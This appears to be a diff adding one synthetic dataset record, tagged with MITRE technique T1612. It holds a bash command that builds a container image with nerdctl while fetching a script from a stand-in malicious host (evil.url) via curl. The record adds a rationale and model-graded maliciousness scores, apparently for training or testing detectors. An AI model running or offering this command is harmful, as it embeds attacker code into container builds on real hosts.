@@ -1,0 +1,41 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "nerdctl build -t payload_image --build-arg PAYLOAD_SCRIPT=$(curl http://evil.url/payload.sh) -f Dockerfile .",
+  "explanation": "Includes the content of a script fetched from a malicious URL as a build argument, embedding it within the built image.",
+  "rationale_steps": [
+    "Fetch a malicious script via curl and store its content.",
+    "Inject this script content directly into the build process as a build argument, embedding it in the image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-10680f09-1f3b59f7",
+  "source_prompt_hash": "10680f09",
+  "timestamp_utc": "2025-07-10T23:22:27.254988Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": false,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 5.01,
+      "command_length": 108
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.91,
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.95,
+        "technical_plausibility": 0.95,
+        "privilege_relevance": 0.5,
+        "reason": "The sample perfectly fits the category of building a malicious image on a host from a benign base, using realistic, technically plausible methods with high malicious intent.",
+        "timestamp": "2025-07-12T18:28:30.215757Z"
+      }
+    ],
+    "llm_average_score": 0.91,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
